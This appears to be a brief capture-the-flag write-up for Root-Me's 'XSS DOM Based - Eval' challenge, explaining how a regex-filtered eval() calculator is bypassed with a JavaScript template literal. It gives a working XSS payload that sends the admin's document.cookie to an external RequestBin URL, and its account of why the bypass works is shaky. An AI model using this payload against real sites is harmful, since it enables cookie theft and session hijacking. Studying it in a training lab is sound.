## Challenge name: XSS DOM Based - Eval

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval)

**The challenge has a calculator that uses `eval()`. It filters input with regex: `/^\d+[\\+|\\-|\\\*|\\/]\d+/`**

**However, `eval()` allows template literals. Use JavaScript template literals to execute code:**

**Payload:**
```
1+1\`${document.location="https://requestbin.url?c="+document.cookie}\`
```

**The template literal `${...}` executes before the regex validation. When the admin visits the crafted URL through the Contact form, their cookie is sent to your RequestBin.**

**Use the captured flag/password to validate the challenge.**

**Thankyou.**
